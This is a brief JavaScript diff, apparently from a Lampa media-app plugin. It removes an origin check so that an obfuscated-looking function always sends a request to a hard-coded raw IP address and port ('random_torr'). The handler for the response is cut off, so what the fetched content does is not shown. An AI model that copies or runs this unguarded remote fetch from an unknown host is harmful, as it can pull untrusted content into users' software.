@@ -4,7 +4,7 @@
 
   (function () {
     function _0x743d45() {
-      if (Lampa.Manifest.origin == "bylampa") {
+      {
         const xhr = new XMLHttpRequest();
         xhr.open("GET", "http://185.87.48.42:8090/random_torr", true);
         xhr.onload = function () {
